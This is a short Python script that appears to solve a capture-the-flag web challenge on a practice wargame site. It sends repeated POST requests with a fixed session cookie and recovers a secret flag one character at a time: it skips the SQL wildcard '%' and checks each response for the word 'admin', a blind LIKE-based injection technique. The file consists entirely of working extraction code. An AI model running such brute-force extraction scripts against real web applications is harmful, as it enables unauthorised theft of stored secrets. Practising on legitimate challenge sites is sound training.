import requests

def my_request(flag):
	url = 'https://p.rubiya.kr/access/'
	param = {"search":flag}
	cookie = {"PHPSESSID":"bo3lg1bveljgjem8eqpm6vs2v1"}
	response = requests.post(url,cookies=cookie,data=param)
	return response


def solve():
	res = "FLAG{"
	for i in range(0,40):
		for c in range(33,127):
			if c == 37:
				continue
			response = my_request(res+chr(c))
			if "admin" in response.text:
				res += chr(c)
				print(res)
				break

if __name__ == "__main__":
	solve()
